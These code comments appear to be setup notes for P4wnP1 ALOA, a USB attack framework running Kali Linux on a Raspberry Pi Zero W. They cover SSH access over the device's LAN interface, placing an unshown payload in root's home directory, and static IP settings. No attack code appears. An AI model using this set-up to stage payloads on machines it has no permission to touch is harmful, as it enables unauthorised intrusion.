//When you connect the Raspberry Pi Zero W with P4wnP1 ALOA installed, upon system bootup, it creates a LAN network interface, which you can use to SSH
//into the backend Kali Linux on the Pi Zero W.

//Place the payload in the home directory of the root user.
//P4wnP1 ALOA uses a static IP for both WiFi and ethernet interface, which of course can be configured and reconfigured from the web client of the framework.
